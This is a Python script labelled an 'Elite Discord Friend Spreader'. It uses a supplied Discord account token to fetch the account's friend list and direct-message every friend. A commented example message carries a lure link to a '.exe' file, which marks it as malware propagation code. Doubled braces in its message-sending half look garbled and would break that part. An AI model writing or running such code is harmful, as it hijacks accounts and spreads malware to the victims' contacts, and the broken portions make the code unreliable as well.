import os, sys, json, re, urllib.request

def spread_discord(token, message):
    """Elite Discord Friend Spreader."""
    try:
        # 1. Get friend list
        url = "https://discord.com/api/v9/users/@me/relationships"
        req = urllib.request.Request(url, headers={
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        })
        with urllib.request.urlopen(req) as response:
            friends = json.loads(response.read().decode())
            
        # 2. Iterate and send message
        for friend in friends:
            if friend['type'] == 1: # Relationship type 1 = Friend
                friend_id = friend['id']
                try:
                    # Create DM channel
                    dm_url = "https://discord.com/api/v9/users/@me/channels"
                    dm_data = json.dumps({"recipient_id": friend_id}).encode()
                    dm_req = urllib.request.Request(dm_url, data=dm_data, headers={
                        "Authorization": token,
                        "Content-Type": "application/json"
                    }, method="POST")
                    with urllib.request.urlopen(dm_req) as dm_resp:
                        channel_id = json.loads(dm_resp.read().decode())['id']
                        
                        # Send Message
                        msg_url = f"https://discord.com/api/v9/channels/{{channel_id}}/messages"
                        msg_data = json.dumps({{"content": message}}).encode()
                        msg_req = urllib.request.Request(msg_url, data=msg_data, headers={{
                            "Authorization": token,
                            "Content-Type": "application/json"
                        }}, method="POST")
                        urllib.request.urlopen(msg_req)
                        print(f"[SPREADER] Sent to {{friend_id}}")
                except: pass
    except Exception as e:
        print(f"[SPREADER] Error: {{e}}")

if __name__ == "__main__":
    # Test with a placeholder token
    # spread_discord("TOKEN_HERE", "Hey check this out: http://mrl-checker.exe")
    pass
